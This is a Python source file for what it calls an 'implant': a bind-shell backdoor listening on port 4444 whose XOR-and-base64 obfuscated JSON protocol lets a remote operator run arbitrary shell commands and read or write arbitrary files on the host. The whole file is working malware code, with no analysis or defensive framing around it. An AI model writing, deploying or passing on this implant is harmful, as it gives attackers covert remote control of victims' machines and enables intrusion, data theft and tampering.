import socket
import json
import base64
import subprocess
import time

HOST = '0.0.0.0'
PORT = 4444
XOR_KEY = b'keyed_up'


def xor_obfuscate(data):
    key_len = len(XOR_KEY)
    return bytes([b ^ XOR_KEY[i % key_len] for i,b in enumerate(data)])

def xor_deobfuscate(data):
    return xor_obfuscate(data)

def base64_obfuscate(data):
    return base64.b64encode(data)

def base64_deobfuscate(data):
    return base64.b64decode(data)



def handle_hello(payload):
    return {"message": "Implant hello", "status":"ok"}

def handle_shutdown(payload):
    return {"status": "shutting down"}

def handle_set_sleep(payload):
    sleep_seconds = payload.get("seconds", 1)
    time.sleep(sleep_seconds)
    return {"status": f"slept for {sleep_seconds} seconds"}

def handle_read_data(payload):
    filename = payload.get("filename", "implant_data.txt")
    try:
        with open(filename, 'r') as f:
            content = f.read()
        return {"filename": filename, "content": content}
    except Exception as e:
        raise RuntimeError(f"Read error: {str(e)}")
    
def handle_write_data(payload):
    filename = payload.get("filename", "implant_data.txt")
    data = payload.get("data", "")
    try:
        with open(filename, 'w') as f:
            f.write(data)
        return {"filename": filename, "status": "written"}
    except Exception as e:
        raise RuntimeError(f"Read error: {str(e)}")
    

def handle_cmd(payload):
    cmd = payload.get("command", "")
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
        return {"command": cmd, "stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
    except Exception as e:
        raise RuntimeError(f"Command execution error: {str(e)}")
    

COMMAND_HANDLERS = {
    "HELLO": handle_hello,
    "SHUTDOWN": handle_shutdown,
    "SET_SLEEP": handle_set_sleep,
    "READ_DATA": handle_read_data,
    "WRITE_DATA": handle_write_data,
    "RUN_CMD": handle_cmd,
}



def handle_client(connection):

    while True:
        length_data = connection.recv(4)
        if not length_data:
            break
        msg_len = int.from_bytes(length_data, "big")

        obfuscated = b''
        while len(obfuscated) < msg_len:
            chunk = connection.recv(msg_len - len(obfuscated))
            if not chunk:
                break
            obfuscated += chunk
            
        if len(obfuscated) != msg_len:
            break

        request = None
        try:
            decoded = base64_deobfuscate(obfuscated)
            plaintext = xor_deobfuscate(decoded)

            request = json.loads(plaintext.decode('utf-8'))
        except Exception as e:
            req_id = request["request_id"] if request is not None else 0

            error_resp = {
                "type": "error",
                "request_id": req_id,
                "payload": {"code": "DE-OBFUSCATION_ERROR", "message": str(e)}
            }
            resp_json = json.dumps(error_resp).encode('utf-8')
            obfuscated_resp = base64_obfuscate(xor_obfuscate(resp_json))
            connection.sendall(len(obfuscated_resp).to_bytes(4, 'big') + obfuscated_resp)
            continue

        cmd_type = request.get("type")
        req_id = request.get("request_id")
        payload = request.get("payload", {})

        try:
            if cmd_type in COMMAND_HANDLERS:
                response_payload = COMMAND_HANDLERS[cmd_type](payload)
                response = {
                    "type": "response",
                    "request_id": req_id,
                    "payload": response_payload
                }
            else:
                response = {
                    "type": "error",
                    "request_id": req_id,
                    "payload": {"code": "UNKOWN_COMMAND", "message": f"Unkown Command: {cmd_type}"}
                }
        except Exception as e:
            response = {
                "type": "error",
                "request_id": req_id,
                "payload": {"code": "HANDLER_ERROR", "message": str(e)}
            }
        

        resp_json = json.dumps(response).encode('utf-8')
        obfuscated_resp = base64_obfuscate(xor_obfuscate(resp_json))
        connection.sendall(len(obfuscated_resp).to_bytes(4, 'big') + obfuscated_resp)

        if cmd_type == "SHUTDOWN":
            break


def main():

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)

    print(f"Implant listening on {HOST}:{PORT}")

    while True:
        connection, addr = server_socket.accept()
        print(f"Implant connection from {addr}")

        handle_client(connection)
        connection.close()
        print("Implant client disconnected")

if __name__ == "__main__":
    main()
